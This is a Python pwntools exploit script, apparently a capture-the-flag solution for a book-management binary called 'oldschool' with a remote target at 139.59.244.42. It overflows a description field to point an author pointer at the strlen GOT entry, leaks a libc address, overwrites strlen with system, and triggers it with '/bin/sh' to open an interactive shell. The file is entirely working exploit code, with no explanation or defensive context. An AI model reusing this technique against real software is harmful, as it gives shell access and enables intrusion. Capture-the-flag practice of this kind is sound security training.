#!/usr/bin/env python
from pwn import *

def add_book(name,author,desc):
    s.sendline('1')
    if len(name) < 0x20:
        name += '\n'
    if len(author) < 0x20:
        author += '\n'
    s.send(name)
    s.send(author)
    s.sendline(str(len(desc)))
    s.send(desc)
    s.recvuntil(':Description:')

def edit_book(index,name,author,desc):
    s.sendline('2')
    s.sendline(str(index))
    s.send(name)
    s.send(author)
    s.send(desc)
    s.recvuntil(':Description:')

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./oldschool_27e20fd0de79d5d1a69f957120c370ed')
    else:
        s = remote('139.59.244.42',31340)

    strlen_got = 0x602028
    strlen_offset = 0x8b720
    system_offset = 0x45390

    add_book('A','A'*0x20,'A')
    edit_book(1,'A','A'*0x20+'\xff','A'*0xe7 + '\x00' + p32(1) + p64(strlen_got-0x20) + '\n')
    s.sendline('2')
    s.sendline('1')
    s.recvuntil('Author: ')
    libc_base = u64(s.recv(6).ljust(8,'\0')) - strlen_offset
    print '[*] libc base is', hex(libc_base)
    s.sendline('')
    s.send(p64(libc_base + system_offset))
    s.sendline('')
    add_book('/bin/sh','A','A')
    s.sendline('2')
    s.sendline('2')
    s.interactive()
